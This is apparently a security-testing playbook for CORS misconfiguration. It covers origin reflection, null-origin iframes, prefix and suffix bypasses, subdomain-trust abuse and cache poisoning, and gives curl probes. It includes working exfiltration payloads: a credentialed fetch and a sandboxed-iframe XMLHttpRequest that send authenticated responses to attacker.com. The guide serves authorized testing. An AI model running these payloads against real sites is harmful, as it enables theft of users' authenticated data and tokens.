---
name: cors_misconfiguration
description: CORS misconfiguration testing for origin reflection, null origin, wildcard abuse, subdomain trust, and exploit chaining with XSS/CSRF
---

# CORS Misconfiguration

Cross-Origin Resource Sharing misconfigurations allow attacker-controlled origins to read authenticated responses from target APIs. The server reflects the attacker's Origin in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`, enabling cross-origin data theft from authenticated sessions. Subtle misconfigurations are common and frequently missed by automated scanners.

## Attack Surface

**Scope**
- API endpoints returning user-specific data (profile, settings, tokens, financial data)
- Endpoints with `Access-Control-Allow-Origin` reflecting request Origin
- Subdomains serving APIs with trust-based CORS (same-site, subdomain wildcards)
- OAuth/token endpoints returning credentials in response body
- Any endpoint accessible with cookies/session but returning sensitive JSON

**Discovery**
- Send `Origin: https://evil.com` to all API endpoints, inspect response headers
- Check for `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`
- Test with `Origin: null` (sandboxed iframes)
- Replay with authenticated session cookies

## High-Value Targets

### Origin Reflection (Wildcard with Credentials)

**Direct reflection**
```bash
# If server reflects any origin:
curl -H "Origin: https://evil.com" https://target.com/api/userinfo
# Response:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true

# Exploit from attacker page:
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json()).then(d => fetch('https://attacker.com/?d='+JSON.stringify(d)))
```

**Prefix matching bypass**
```
# Server checks if Origin starts with "https://target.com":
# Bypass: https://target.com.attacker.com
# Bypass: https://target.com%60.attacker.com (backtick)
# Bypass: https://target.com.attacker.com (subdomain of attacker)

curl -H "Origin: https://target.com.evil.com" https://target.com/api/userinfo
```

**Suffix matching bypass**
```
# Server checks if Origin ends with "target.com":
# Bypass: https://eviltarget.com
# Bypass: https://notarget.com (if checking endsWith(".target.com") incorrectly)
# Bypass: https://target.com.attacker.com

curl -H "Origin: https://eviltarget.com" https://target.com/api/userinfo
```

### Null Origin

**Sandboxed iframe exploitation**
```html
<!-- Attacker page -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var req = new XMLHttpRequest();
req.open('GET', 'https://target.com/api/userinfo', true);
req.withCredentials = true;
req.onload = function() {
  // Exfiltrate data
  window.parent.location = 'https://attacker.com/?d=' + encodeURIComponent(req.responseText);
};
req.send();
</script>
">
# Origin: null → accepted if server allows null origin
```

**Other null origin sources**
```
# data: URI (some browsers)
# file: URI
# Cross-origin redirect chains
# sandboxed iframe combinations
```

### Trusted Subdomain Abuse

**Subdomain takeover + CORS**
```
# If *.target.com is trusted and a subdomain is vulnerable to takeover:
# 1. Take over abandoned-sub.target.com (dangling CNAME)
# 2. Host malicious page on abandoned-sub.target.com
# 3. CORS trust allows reading cross-origin authenticated data

# Check for dangling CNAMEs:
dig CNAME abandoned.target.com
# → points to expired-cloud-service.com (available for registration)
```

**XSS on trusted subdomain**
```
# If any subdomain has XSS and CORS trusts *.target.com:
# 1. XSS on blog.target.com
# 2. Inject script reading api.target.com/userinfo
# 3. CORS allows because Origin: https://blog.target.com
```

### Wildcard with Credentials

```
# Access-Control-Allow-Origin: * with credentials is rejected by browsers
# BUT: some servers use * with Allow-Credentials, which browsers ignore
# The vulnerability is when servers dynamically set origin to * on auth bypass

# Check if server sets * when no auth cookies present:
curl https://target.com/api/userinfo
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
# Browser will block this, but server-side behavior reveals logic errors
```

### Pre-Domain CORS Bypass

```
# Register domain before the TLD suffix:
# If target uses api.example.com, register apiexample.com
# Or: example-com.api.evil.com

# Regex: /^https:\/\/.*\.example\.com$/
# Bypass: https://example.com.evil.com
# Bypass: https://example.com\@evil.com (some parsers)
```

## Bypass Techniques

**Origin Validation Bypass**
```bash
# Test all origin variations:
curl -H "Origin: https://evil.com" -I https://target.com/api/data
curl -H "Origin: https://target.com.evil.com" -I https://target.com/api/data
curl -H "Origin: https://eviltarget.com" -I https://target.com/api/data
curl -H "Origin: null" -I https://target.com/api/data
curl -H "Origin: https://target.com" -I https://target.com/api/data

# Unicode/encoding bypasses for regex:
# https://target%C0%AEcom.attacker.com
# https://target.com%23.attacker.com (# fragment)
# https://target.com%00.attacker.com (null byte)
```

**Header Injection via CRLF**
```
# If server reflects origin with CRLF injection:
# Origin: https://evil.com\r\nAccess-Control-Allow-Credentials: true
# Some proxies/load balancers may parse this as two separate headers
```

**Vary: Origin Bypass**
```
# If server sends Vary: Origin but caches responses:
# First request with evil origin → cached response with evil CORS
# Second request from victim → serves cached CORS headers
# CDN/proxy cache poisoning with CORS
```

## Testing Methodology

1. **Baseline request** — Send normal cross-origin request, observe if CORS headers present at all
2. **Origin reflection** — Send `Origin: https://evil.com`, check if reflected in `Access-Control-Allow-Origin`
3. **Null origin** — Send `Origin: null`, test sandboxed iframe if accepted
4. **Prefix/suffix bypass** — Test `target.com.evil.com`, `eviltarget.com`, `sub.target.com.attacker.com`
5. **Subdomain trust** — Test `Origin: https://subdomain.target.com` for wildcard subdomain trust. Check if any subdomains are vulnerable to takeover or XSS
6. **Credentials inclusion** — Confirm `Access-Control-Allow-Credentials: true` is present when origin is reflected
7. **Authenticated data** — Replay requests with session cookies, confirm sensitive data is returned with permissive CORS headers
8. **Cache behavior** — Test if CORS headers are cached by CDN/proxy (Vary header, cache key composition)
9. **Exploit chain** — Build proof-of-concept: attacker page → fetch with credentials → exfiltrate target data

## Validation

1. Demonstrate a cross-origin fetch that reads authenticated user data from attacker-controlled origin
2. Show the complete HTTP request/response with permissive CORS headers
3. For subdomain trust: prove either subdomain takeover or XSS on trusted subdomain
4. For null origin: provide working sandboxed iframe PoC
5. Confirm the data returned is genuinely sensitive (PII, tokens, account data)

## False Positives

- `Access-Control-Allow-Origin: *` without `Allow-Credentials: true` (public data only, browser blocks credentialed requests)
- CORS headers on static assets (images, CSS, JS) with no sensitive data
- Properly validated origins that only allow exact-match trusted domains
- `Access-Control-Allow-Origin` reflecting the same origin as the request (not a misconfiguration, same-origin)
- Endpoints that don't require authentication (no credentials to steal)
- Pre-flight responses (`OPTIONS`) that differ from actual response CORS behavior

## Impact

- Cross-origin authenticated data theft (user profiles, API keys, tokens, financial data)
- Account information disclosure enabling social engineering or account takeover
- OAuth token theft if token endpoint has permissive CORS
- Session fixation combined with CORS to bypass same-site cookie protections
- Full API data exfiltration from authenticated users via attacker-controlled origin

## Pro Tips

1. Always test authenticated endpoints — public endpoints with permissive CORS are low impact
2. Check response body for sensitive data before reporting — CORS on a healthcheck endpoint is not a finding
3. Test every subdomain for CORS trust individually — `sub.target.com` may trust `*.target.com` but `api.target.com` may not
4. Use Burp Collaborator or custom DNS to test if subdomains are truly controlled (subdomain takeover)
5. CORS cache poisoning is high-impact: test with `X-Forwarded-Host` and cache-busting headers
6. Check if the application uses `SameSite=None` cookies — required for CORS credential theft to work
7. Mobile apps and non-browser clients ignore CORS but may still be vulnerable to direct API abuse
8. Document the exact Origin value that works and the data accessible — this differentiates low-impact reflection from exploitable misconfiguration
